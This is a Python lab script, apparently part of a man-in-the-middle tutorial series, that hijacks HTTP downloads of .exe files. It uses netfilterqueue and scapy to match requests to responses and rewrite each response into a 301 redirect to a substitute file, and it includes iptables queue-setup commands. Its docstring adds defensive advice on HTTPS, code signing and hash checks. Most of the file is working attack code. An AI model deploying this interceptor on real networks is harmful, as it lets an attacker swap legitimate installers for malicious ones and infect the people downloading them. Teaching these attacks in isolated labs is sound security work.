#!/usr/bin/env python3
"""
file_interceptor.py — replace a file being downloaded over HTTP with our own.

================================ THE LESSON ================================

WHERE THIS SITS
    Another "once you're the MITM" tool (needs arp_spoofer.py + IP forwarding +
    the NFQUEUE iptables rule, same as dns_spoofer.py). Here we tamper with an
    HTTP download in flight.

THE WEAKNESS: UNVERIFIED PLAINTEXT DOWNLOADS
    When a target downloads a file over plain HTTP, nothing proves the bytes it
    receives are the bytes the server sent. A man in the middle can answer the
    request with a REDIRECT to a different file. The classic real-world abuse is
    swapping a legitimate installer/update for a malicious one — which is
    exactly why software updates must be signed and served over HTTPS. Seeing it
    work firsthand is the lesson.

HOW IT WORKS — HTTP REQUEST/RESPONSE SPLIT ACROSS TWO QUEUES
    We watch two directions:
      * The target's outbound HTTP REQUEST (TCP dport 80). If it's asking for a
        file type we target (e.g. ".exe"), we remember that TCP connection's
        "ack" number so we can recognise the matching response coming back.
      * The server's inbound HTTP RESPONSE (TCP sport 80) on that connection.
        We replace its body with a tiny HTTP 301 redirect pointing at our own
        file URL. The target's browser follows the redirect and downloads ours.

    (A simpler teaching variant redirects ALL .exe/.pdf requests; the ack-number
    matching below is the robust version that pairs each response to its request.)

=============================== THE PYTHON ================================
    * netfilterqueue + scapy Raw/TCP — inspect and rewrite HTTP payloads.
    * conditionals on TCP ports — dport 80 = request, sport 80 = response.
    * dict of in-flight connections keyed by TCP ack — basic stateful tracking.
    * building a raw HTTP response string by hand (status line + headers).

=========================== DEFENSIVE TAKEAWAY ===========================
    * HTTPS end to end. A MITM on a TLS download can't read or rewrite the body,
      and a redirect to another host triggers a certificate mismatch.
    * Signed packages / code signing: even if the bytes are swapped, the
      signature check fails and the installer refuses to run. (apt, Windows
      Authenticode, macOS notarization all do this.)
    * Publish and check file hashes (SHA-256) for manual downloads.
    * And again: kill the ARP spoofing at the switch so no one reaches the
      middle in the first place.

USAGE (inside your lab, as root):
    # Divert both directions into the queue:
    iptables -I FORWARD -j NFQUEUE --queue-num 0
    sudo python3 file_interceptor.py
    iptables --flush   # when done
===========================================================================
"""

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import IP, TCP, Raw
from netfilterqueue import NetfilterQueue

# The file extension(s) we want to hijack, and the URL we redirect victims to.
# Point REDIRECT_URL at a harmless file on your own lab web server.
TARGET_EXTENSIONS = [b".exe"]
REDIRECT_URL = b"http://10.0.0.5/lab-sample.txt"

# Tracks in-flight requests we care about, keyed by the TCP ack number that
# will appear on the matching response. Value isn't important; presence is.
pending_requests = {}


def process_packet(nfq_packet):
    scapy_packet = IP(nfq_packet.get_payload())

    # Only HTTP (TCP) packets with an actual payload interest us.
    if scapy_packet.haslayer(Raw) and scapy_packet.haslayer(TCP):
        try:
            load = scapy_packet[Raw].load
        except IndexError:
            nfq_packet.accept()
            return

        # --- Outbound REQUEST (target -> server), destination port 80 ---
        if scapy_packet[TCP].dport == 80:
            if any(ext in load for ext in TARGET_EXTENSIONS):
                # Remember this connection so we can catch its response. The
                # response's TCP ack equals this request's TCP seq.
                pending_requests[scapy_packet[TCP].seq] = True
                print(f"[+] Target requested a targeted file (seq={scapy_packet[TCP].seq}).")

        # --- Inbound RESPONSE (server -> target), source port 80 ---
        elif scapy_packet[TCP].sport == 80:
            ack = scapy_packet[TCP].ack
            if ack in pending_requests:
                del pending_requests[ack]
                print("[+] Matching response found. Injecting redirect.")

                # Overwrite the HTTP response with a minimal 301 redirect.
                # \r\n line endings and the blank line before the body are
                # part of the HTTP spec — browsers are strict about them.
                redirect = (
                    b"HTTP/1.1 301 Moved Permanently\r\n"
                    b"Location: " + REDIRECT_URL + b"\r\n\r\n"
                )
                scapy_packet[Raw].load = redirect

                # Let scapy recompute lengths/checksums after our edit.
                del scapy_packet[IP].len
                del scapy_packet[IP].chksum
                del scapy_packet[TCP].chksum

                nfq_packet.set_payload(bytes(scapy_packet))

    nfq_packet.accept()


def main():
    queue = NetfilterQueue()
    try:
        queue.bind(0, process_packet)
        print("[i] Bound to NFQUEUE 0. Ctrl+C to stop.\n")
        queue.run()
    except KeyboardInterrupt:
        print("\n[i] Stopping. Don't forget: iptables --flush")
    finally:
        queue.unbind()


if __name__ == "__main__":
    main()
